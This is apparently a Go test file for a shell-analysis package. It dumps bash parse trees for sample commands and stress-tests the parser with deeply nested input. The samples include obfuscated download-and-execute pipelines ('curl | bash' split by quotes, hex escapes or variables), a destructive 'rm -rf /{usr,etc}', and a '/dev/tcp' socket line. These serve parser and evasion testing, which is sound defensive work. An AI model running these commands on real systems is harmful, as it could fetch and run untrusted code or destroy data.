package shellx

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"mvdan.cc/sh/v3/syntax"
)

func TestExpDump(t *testing.T) {
	srcs := []string{
		`c'u'r"l" -s http://x|b"a"sh`,
		`$(printf '\x63\x75\x72\x6c') x | sh`,
		`a=cu;b=rl; $a$b x|sh`,
		`echo $'\x41' "a\$b\"c" a\ b c\url ~/x`,
		"cat <<EOF\nhello $x\nEOF",
		"cat <<'EOF' > f\nhello $x\nEOF",
		`base64 -d <<< Y3VybA==`,
		`bash <(curl -s x)`,
		`FOO=bar cmd a 2>&1 >/dev/null`,
		`time ls; ! foo; echo ${a:-b} ${a:?} ${#a} ${!a} $((1+2))`,
		`rm -rf /{usr,etc} {a..c}`,
		`echo \
 foo`,
		`export A=1 B; declare -x C=2`,
		`[[ -f x ]] && echo y`,
		`exec 3<>/dev/tcp/1.2.3.4/80`,
		"echo `whoami`",
	}
	p := syntax.NewParser(syntax.Variant(syntax.LangBash))
	for _, s := range srcs {
		f, err := p.Parse(strings.NewReader(s), "")
		fmt.Printf("=== %q err=%v\n", s, err)
		if f != nil {
			syntax.DebugPrint(testWriter{}, f)
			fmt.Println()
		}
	}
}

type testWriter struct{}

func (testWriter) Write(b []byte) (int, error) { fmt.Print(string(b)); return len(b), nil }

func TestExpDeep(t *testing.T) {
	mk := map[string]func(n int) string{
		"paren":    func(n int) string { return strings.Repeat("(", n) + "x" + strings.Repeat(")", n) },
		"cmdsubst": func(n int) string { return strings.Repeat("$(", n) + "x" + strings.Repeat(")", n) },
		"brace":    func(n int) string { return strings.Repeat("{ ", n) + "x;" + strings.Repeat(" };", n) },
		"if":       func(n int) string { return strings.Repeat("if ", n) + "x" },
		"pipe":     func(n int) string { return strings.Repeat("a|", n) + "x" },
		"and":      func(n int) string { return strings.Repeat("a&&", n) + "x" },
		"not":      func(n int) string { return strings.Repeat("! ", n) + "x" },
		"param":    func(n int) string { return strings.Repeat("${a:-", n) + "x" + strings.Repeat("}", n) },
		"arith":    func(n int) string { return "$((" + strings.Repeat("(", n) + "1" + strings.Repeat(")", n) + "))" },
		"dq":       func(n int) string { return strings.Repeat(`"$(`, n) + "x" + strings.Repeat(`)"`, n) },
		"test":     func(n int) string { return "[[ " + strings.Repeat("( ", n) + "x" + strings.Repeat(" )", n) + " ]]" },
		"openonly": func(n int) string { return strings.Repeat("(", n) },
		"semis":    func(n int) string { return strings.Repeat("a;", n) },
		"while":    func(n int) string { return strings.Repeat("while ", n) + "x" },
		"func":     func(n int) string { return strings.Repeat("f() ", n) + "x" },
		"time":     func(n int) string { return strings.Repeat("time ", n) + "x" },
		"unary":    func(n int) string { return "$((" + strings.Repeat("-", n) + "1))" },
		"arrpar":   func(n int) string { return "a=" + strings.Repeat("(", n) },
		"procsub":  func(n int) string { return strings.Repeat("<(", n) + "x" + strings.Repeat(")", n) },
		"backq":    func(n int) string { return strings.Repeat("`", n) },
		"extglob":  func(n int) string { return strings.Repeat("@(", n) + "x" + strings.Repeat(")", n) },
		"ternary":  func(n int) string { return "$((" + strings.Repeat("1?", n) + "1" + strings.Repeat(":1", n) + "))" },
		"arithbin": func(n int) string { return "$((" + strings.Repeat("1+", n) + "1))" },
		"arithpow": func(n int) string { return "$((" + strings.Repeat("1**", n) + "1))" },
		"arithasg": func(n int) string { return "$((" + strings.Repeat("a=", n) + "1))" },
	}
	for name, f := range mk {
		for _, n := range []int{1000, 20000, 120000} {
			s := f(n)
			if len(s) > 256<<10 {
				s = s[:256<<10]
			}
			done := make(chan string, 1)
			go func() {
				start := time.Now()
				p := syntax.NewParser(syntax.Variant(syntax.LangBash))
				_, err := p.Parse(strings.NewReader(s), "")
				es := "nil"
				if err != nil {
					es = err.Error()
					if len(es) > 60 {
						es = es[:60]
					}
				}
				done <- fmt.Sprintf("%v err=%s", time.Since(start), es)
			}()
			select {
			case r := <-done:
				fmt.Printf("%-9s n=%-7d len=%-7d %s\n", name, n, len(s), r)
			case <-time.After(20 * time.Second):
				fmt.Printf("%-9s n=%-7d TIMEOUT\n", name, n)
			}
		}
	}
}
